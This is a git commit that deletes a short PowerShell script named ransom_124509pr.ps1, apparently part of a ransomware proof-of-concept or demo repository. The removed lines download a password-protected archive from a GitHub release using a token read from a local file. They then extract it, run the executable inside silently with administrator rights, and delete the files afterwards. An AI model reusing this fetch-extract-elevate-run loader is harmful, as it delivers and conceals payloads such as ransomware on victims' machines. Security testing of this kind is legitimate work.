5588bf36e8372893b54ed1a4ab0528d4b6c16d93
tameval <114147355+tameval@users.noreply.github.com>
2022-10-22 17:44:44 +0900

    Delete ransom_124509pr.ps1

--- ransom_124509pr.ps1
+++
@@ -1,5 +0,0 @@
-$tkn= Get-Content "C:\CRDemo\tkn.txt"; $headers=@{"Authorization"="token ghp_"+$tkn; "Accept"="application/octet-stream"}; Invoke-WebRequest "https://api.github.com/repos/tameval/poc124509/releases/assets/81659605" -Headers $headers -OutFile $env:TEMP\ransom_test.zip
-cmd.exe /c '"C:\Program Files\7-Zip\7z.exe" e -ppassword123 -o%TEMP% %TEMP%\ransom_test.zip'
-Remove-Item $env:TEMP\ransom_test.zip
-Start-Process -FilePath $env:TEMP\ransom_test_v???.exe -Args "/S" -Verb RunAs -Wait
-Remove-Item $env:TEMP\ransom_test_v???.exe
